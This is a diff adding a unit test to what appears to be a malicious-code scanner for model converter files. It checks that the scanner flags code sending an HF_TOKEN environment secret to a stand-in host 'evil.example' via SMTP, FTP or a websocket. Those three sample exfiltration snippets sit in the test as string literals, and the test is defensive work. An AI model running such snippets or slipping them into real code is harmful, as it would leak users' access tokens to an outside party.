@@ -4455,6 +4455,37 @@ def test_a_string_method_called_unbound_is_still_that_method():
     ) == []
 
 
+def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
+    """The honest hub download can stay in the file. smtplib.SMTP(
+    "evil.example").sendmail(..., os.environ["HF_TOKEN"]) makes both original
+    predicates true, and no walk over the literals can say where it sends,
+    because its destination is a bare host rather than a URL.
+
+    requests, httpx and aiohttp are deliberately not on that list: they take a
+    URL, which this reads.
+    """
+    scan_converter_source = _load(
+        "converter_scan_client_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    download = 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'import smtplib\n'
+        'smtplib.SMTP("evil.example").sendmail("a", "b",'
+        ' os.environ["HF_TOKEN"])\n',
+        'import ftplib\n'
+        'ftplib.FTP("evil.example").storbinary("STOR x",'
+        ' os.environ["HF_TOKEN"].encode())\n',
+        'from websockets import connect as c\nc("wss://evil.example")\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
+    # The download on its own is what the allowance is for.
+    assert scan_converter_source(preamble + download) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
